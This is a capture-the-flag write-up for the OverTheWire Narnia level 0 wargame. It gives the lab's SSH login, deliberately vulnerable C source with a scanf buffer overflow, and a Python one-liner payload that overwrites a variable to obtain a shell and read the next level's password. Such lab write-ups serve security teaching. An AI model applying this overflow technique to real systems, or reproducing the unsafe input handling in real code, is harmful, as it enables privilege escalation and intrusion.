## Login 

` SSH : ssh narnia0@narnia.labs.overthewire.org -p 2226 `
` Pass : narnia0 `

## Solution

First, let’s try to execute the program…

```
narnia0@narnia:~$ cd /narnia/
narnia0@narnia:/narnia$ ./narnia0 
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: TEST
buf: TEST
val: 0x41414141
WAY OFF!!!!
```

### Source Code

Now, let’s take a look at the source code.

```
#include <stdio.h>
#include <stdlib.h>

int main(){
    long val=0x41414141;
    char buf[20];

    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
    printf("Here is your chance: ");
    scanf("%24s",&buf);

    printf("buf: %s\n",buf);
    printf("val: 0x%08x\n",val);

    if(val==0xdeadbeef){
        setreuid(geteuid(),geteuid());
        system("/bin/sh");
    }
    else {
        printf("WAY OFF!!!!\n");
        exit(1);
    }

    return 0;
}
```

To solve this challenge, we need to change the **val** value initialized with `0x41414141` to `0xdeadbeef`.

Here, the issue come from the _scanf()_ function. It allows the user to enter **24** chars however, the **buf** variable is only **20** bytes so, we can overwrite _4_ bytes.

Let’s try to write 24 bytes as input and check if the address changes.

```
narnia0@narnia:/narnia$ python -c 'print 20 * "A" + "BBBB"' | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAABBBB
val: 0x42424242
WAY OFF!!!!
```

It seems that we were able to modify the original value of **val** with `0x42424242`. We will do the same thing with the right value or `0xdeadbeef`

```
narnia0@narnia:/narnia$ (python -c 'print 20*"A" + "\xef\xbe\xad\xde"'; cat;) | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�
val: 0xdeadbeef
whoami
narnia1
cat /etc/narnia_pass/narnia1
WDcYUTG5ul
```

Easy, right ?
